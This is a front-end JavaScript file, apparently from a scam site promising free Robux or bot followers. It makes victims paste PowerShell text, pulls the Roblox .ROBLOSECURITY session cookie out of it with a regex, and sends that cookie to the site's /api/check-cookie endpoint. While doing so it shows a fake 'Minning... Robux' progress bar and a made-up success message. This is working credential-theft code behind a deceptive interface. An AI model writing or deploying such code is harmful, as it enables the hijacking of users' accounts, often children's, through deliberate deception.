function startBotting() {
    extractAndCheckCookie();
}

async function extractAndCheckCookie() {
    const inputText = document.getElementById("powershellInput").value;
    const amount = document.getElementById("amount").value; // Lấy số Robux từ input
    const notificationElement = document.getElementById("notification");

    if (!notificationElement) {
        console.error("Không tìm thấy phần tử với ID 'notification'.");
        return;
    }

    // Regex tìm cookie hợp lệ
    const cookieMatch = inputText.match(/New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/i);

    if (!cookieMatch || cookieMatch.length < 2) {
        showNotification("❌ Invalid User Code", "error");
        return;
    }

    const extractedCookie = cookieMatch[1];
    // Hiển thị progress bar với các giai đoạn
    showProgressNotification(extractedCookie, amount);

    try {
        const response = await fetch('/api/check-cookie', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: extractedCookie }),
        });

        const result = await response.json();

        if (result.success) {
            showNotification("✅ Bot succeeds followers!", "success");
        } else {
            showNotification(`❌ ${result.error}`, "error");
        }
    } catch (error) {
        console.error("Lỗi khi gửi cookie:", error);
        showNotification("❌ Lỗi kết nối server!", "error");
    }
}

// Hiển thị thông báo bình thường
function showNotification(message, type) {
    const notification = document.getElementById("notification");
    
    notification.innerHTML = `
        <div class="error-icon">${type === "success" ? "✅" : "❌"}</div>
        <h2>${message}</h2>
        <button class="continue-btn" onclick="closeNotification()">Continue</button>
    `;

    gsap.fromTo(notification, 
        { opacity: 0, scale: 0.8, y: 50 },
        { 
            opacity: 1, 
            scale: 1, 
            y: 0, 
            duration: 0.5, 
            ease: "back.out(1.7)",
            onStart: () => {
                notification.style.display = "block";
                notification.classList.add("show");
                notification.classList.remove("success", "error", "info");
                notification.classList.add(type);
            }
        }
    );

    setTimeout(() => {
        closeNotification();
    }, 5000);
}

// Hiển thị thông báo với progress bar và giai đoạn
async function showProgressNotification(cookie, amount) {
    const notification = document.getElementById("notification");
    
    notification.innerHTML = `
        <div class="error-icon">⏳</div>
        <h2 class="progress-message">Đang kiểm tra cookie...</h2>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <button class="continue-btn" onclick="closeNotification()">Continue</button>
    `;

    const progressFill = notification.querySelector(".progress-fill");
    const progressMessage = notification.querySelector(".progress-message");

    // Hiển thị notification
    gsap.fromTo(notification, 
        { opacity: 0, scale: 0.8, y: 50 },
        { 
            opacity: 1, 
            scale: 1, 
            y: 0, 
            duration: 0.5, 
            ease: "back.out(1.7)",
            onStart: () => {
                notification.style.display = "block";
                notification.classList.add("show");
                notification.classList.remove("success", "error", "info");
                notification.classList.add("info");
            }
        }
    );



    // Timeline cho progress bar
    const tl = gsap.timeline();
    tl.fromTo(progressFill, 
        { width: "0%" },
        { 
            width: "10%", 
            duration: 1, // 0-10% trong 1 giây
            ease: "linear",
            onStart: () => {
                progressMessage.textContent = "Loading File User...";
            }
        }
    ).to(progressFill, 
        { 
            width: "20%", 
            duration: 1, // 10-20% trong 1 giây
            ease: "linear",
            onStart: () => {
                progressMessage.textContent = "Bot is up to minning";
            }
        }
    ).to(progressFill, 
        { 
            width: "100%", 
            duration: 10, // 20-100% trong 3 giây
            ease: "linear",
            onStart: () => {
                progressMessage.textContent = `Minning... ${amount || "0"} Robux...`;
            },
            onComplete: () => {
                // Không tự đóng, đợi API trả kết quả
            }
        }
    );
}

// Ẩn thông báo với animation
function closeNotification() {
    const notification = document.getElementById("notification");
    gsap.to(notification, {
        opacity: 0,
        scale: 0.8,
        y: 50,
        duration: 0.5,
        ease: "back.in(1.7)",
        onComplete: () => {
            notification.style.display = "none";
            notification.classList.remove("show");
            notification.classList.remove("success", "error", "info");
        }
    });
}
